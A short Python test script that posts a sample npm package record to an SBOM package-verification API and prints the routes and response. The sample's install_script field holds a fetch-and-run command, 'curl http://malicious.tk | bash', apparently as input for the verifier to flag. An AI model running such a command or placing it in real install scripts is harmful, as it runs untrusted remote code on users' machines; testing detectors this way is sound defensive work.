import sys
import os
repo_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
if repo_root not in sys.path:
    sys.path.insert(0, repo_root)
from starlette.testclient import TestClient
from src.api.app import app
import json

client = TestClient(app)
# Debug: list registered routes
print('Registered routes:')
for r in sorted({getattr(r, 'path', '') for r in app.router.routes}):
    if r:
        print(r)
payload = {
    'name': 'lodasdh',
    'version': '1.0.0',
    'ecosystem': 'npm',
    'install_script': 'curl http://malicious.tk | bash',
    'observed_hosts': ['pastebin.com', 'example.com']
}
r = client.post('/api/v1/sbom/verify_package', json=payload)
print('status', r.status_code)
try:
    print(json.dumps(r.json(), indent=2))
except Exception:
    print(r.text)
